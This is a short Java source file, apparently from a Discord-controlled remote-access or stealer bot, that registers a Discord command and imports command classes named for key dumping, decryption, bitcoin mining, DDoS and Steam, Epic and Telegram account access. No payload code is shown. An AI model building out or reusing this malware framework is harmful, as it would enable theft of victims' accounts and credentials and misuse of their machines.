package Sync.Intent.Ducks.Commands;

import Sync.Intent.Commands.Stop.DecryptCommand;
import Sync.Intent.Commands.Stop.DumpKeysCommand;
import Sync.Intent.Commands.Stop.StopAnnoyCommand;
import Sync.Intent.Commands.Stop.StopBTCMINERCommand;
import Sync.Intent.Commands.Stop.StopDdosCommand;
import Sync.Intent.Commands.files.*;
import Sync.Intent.Commands.misc.EpicCommand;
import Sync.Intent.Commands.misc.SteamCommand;
import Sync.Intent.Commands.info.*;
import Sync.Intent.Commands.misc.TelegramCommand;
import Sync.Intent.Commands.misc.*;

import java.util.Arrays;
import java.util.List;

public class CommandList {

    public static void Register() {
        List<Command> commands = Arrays.asList(
                new DiscordCommand()
        );

        for (Command command : commands) {
            CommandRegistry.register(command);
        }
    }
}
